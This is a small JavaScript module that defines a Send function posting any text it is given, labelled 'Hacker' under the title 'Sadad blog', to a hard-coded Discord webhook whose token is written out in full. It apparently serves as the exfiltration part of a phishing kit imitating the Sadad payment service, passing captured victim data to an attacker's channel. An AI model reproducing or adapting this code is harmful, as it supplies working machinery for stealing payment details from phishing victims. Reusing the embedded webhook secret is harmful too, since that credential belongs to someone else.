import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1332867888767303711/R-0URZNMXGfpq0BHqGpDJmt4zEYvBltJMnHjpYNvopWIUmwNogVvxVKVa8ZVr7ghSsBR",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
